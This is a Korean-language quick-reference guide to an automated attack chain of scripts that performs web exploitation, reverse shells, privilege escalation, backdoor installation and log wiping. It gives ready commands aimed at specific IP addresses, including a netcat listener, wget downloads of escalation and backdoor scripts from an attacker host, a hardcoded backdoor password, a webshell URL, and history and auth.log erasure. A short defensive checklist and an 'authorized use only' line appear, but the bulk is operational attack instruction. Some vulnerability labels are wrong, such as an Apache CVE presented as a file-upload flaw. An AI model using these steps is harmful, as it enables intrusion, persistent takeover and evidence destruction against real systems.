# 빠른 참조 가이드

## 전체 공격 체인 (한 눈에)

```
초기 침투 → 실행 → 권한상승 → 영속성 → 완전장악
(auto.py)  (post)  (priv_esc)  (backdoor)  (SSH)
```

## 각 스크립트 역할

| 파일 | 역할 | 주요 기능 |
|------|------|----------|
| `auto.py` | 초기 침투 | SQL Injection, 웹쉘 업로드, XSS, CSRF |
| `post_exploit.py` | 후속 공격 | 웹쉘 발견, 정보 수집, Reverse Shell |
| `privilege_escalation.sh` | 권한 상승 | SUID, Sudo, Docker, Kernel 악용 |
| `backdoor_install.sh` | 백도어 설치 | SSH, Cron, SUID, 웹, 사용자 백도어 |
| `full_attack_chain.sh` | 전체 자동화 | 모든 단계 통합 실행 |

## 빠른 실행

```bash
# 원라이너
./full_attack_chain.sh <타겟IP> <공격자IP>

# 예시
./full_attack_chain.sh 15.164.95.252 57.181.28.7
```

## 각 단계별 핵심 명령어

### 1. 초기 침투
```bash
python3 auto.py http://15.164.95.252 http://57.181.28.7:5000
```
**결과:** 웹쉘 업로드 (`shell.jpg`)

### 2. 정보 수집 & Reverse Shell
```bash
# C2 서버에서
nc -lvnp 4444

# 로컬에서
python3 post_exploit.py 15.164.95.252 57.181.28.7 4444
```
**결과:** 쌍방향 쉘 획득

### 3. 권한 상승
```bash
# Reverse Shell에서
wget http://57.181.28.7:5000/scripts/privilege_escalation.sh
bash privilege_escalation.sh
```
**결과:** Root 권한 획득

### 4. 백도어 설치
```bash
# Root 권한에서
wget http://57.181.28.7:5000/scripts/backdoor_install.sh
bash backdoor_install.sh 57.181.28.7
```
**결과:** 5개 백도어 설치

### 5. 접속 확인
```bash
ssh sysadmin@15.164.95.252  # 비밀번호: P@ssw0rd123!
```

## 설치된 백도어

| 백도어 | 접근 방법 | 용도 |
|--------|----------|------|
| SSH | `ssh root@타겟IP` | 은밀한 접속 |
| 사용자 | `ssh sysadmin@타겟IP` (P@ssw0rd123!) | 대안 접속 |
| Cron | 자동 (5분마다 4444 포트) | 자동 재연결 |
| SUID | `/usr/local/bin/update-checker --shell` | 로컬 권한상승 |
| 웹 | `http://타겟IP/.system.php?c=id` | 웹 명령 실행 |

## 트러블슈팅

### 웹쉘 안 찾아짐
```bash
# 수동 확인
curl 'http://15.164.95.252/file.php?name=shell.jpg&cmd=whoami'
```

### Reverse Shell 안 연결됨
```bash
# 방화벽 확인 (C2 서버)
sudo ufw allow 4444/tcp

# AWS 보안 그룹에서 4444 인바운드 열기
```

### 권한 상승 실패
```bash
# 수동 확인
find / -perm -4000 -type f 2>/dev/null
sudo -l
groups
```

## MITRE ATT&CK 매핑

| 단계 | 전술 | 기법 ID | 기법명 |
|------|------|---------|--------|
| 1 | Initial Access | T1190 | Exploit Public-Facing Application |
| 2 | Execution | T1059.004 | Unix Shell |
| 3 | Persistence | T1098.004 | SSH Authorized Keys |
| 4 | Privilege Escalation | T1548.001 | Setuid and Setgid |
| 5 | Discovery | T1082 | System Information Discovery |

## 핵심 취약점

| 취약점 | CVE | CVSS | 영향 |
|--------|-----|------|------|
| SQL Injection | OWASP A03 | 9.8 | 인증 우회 |
| File Upload | CVE-2021-41773 | 9.1 | 원격 코드 실행 |
| Kernel Exploit | CVE-2021-3493 | 7.8 | 권한 상승 |

## 방어 체크리스트

- [ ] Prepared Statements 사용 (SQL Injection 방지)
- [ ] 파일 업로드 화이트리스트 + MIME 검증
- [ ] 업로드 디렉토리 실행 권한 제거
- [ ] XSS 방지 (htmlspecialchars)
- [ ] CSRF 토큰 구현
- [ ] 불필요한 SUID 제거
- [ ] Sudo 정책 최소화
- [ ] SSH authorized_keys 모니터링
- [ ] 아웃바운드 방화벽 설정
- [ ] 정기적인 보안 패치

## 유용한 명령어

### 정보 수집
```bash
whoami && hostname && id
uname -a
cat /etc/os-release
ps aux | grep -E "(apache|nginx|postgres)"
```

### 권한 상승 확인
```bash
sudo -l
find / -perm -4000 2>/dev/null
groups
docker ps
```

### 백도어 확인
```bash
cat /root/.ssh/authorized_keys
cat /etc/passwd | grep ":0:"
ls -la /etc/cron.d/
find /usr/local/bin -perm -4000
```

### 로그 정리
```bash
history -c
> /var/log/auth.log
> ~/.bash_history
```

## 참고 문서

- **전체 설명:** `ATTACK_CHAIN_EXPLAINED.md`
- **사용 가이드:** `ATTACK_GUIDE.md`
- **빠른 시작:** `README.md`

## 긴급 연락처

- **MITRE ATT&CK:** https://attack.mitre.org/
- **GTFOBins:** https://gtfobins.github.io/
- **OWASP:** https://owasp.org/

---

**⚠️ 경고:** 승인된 환경에서만 사용!
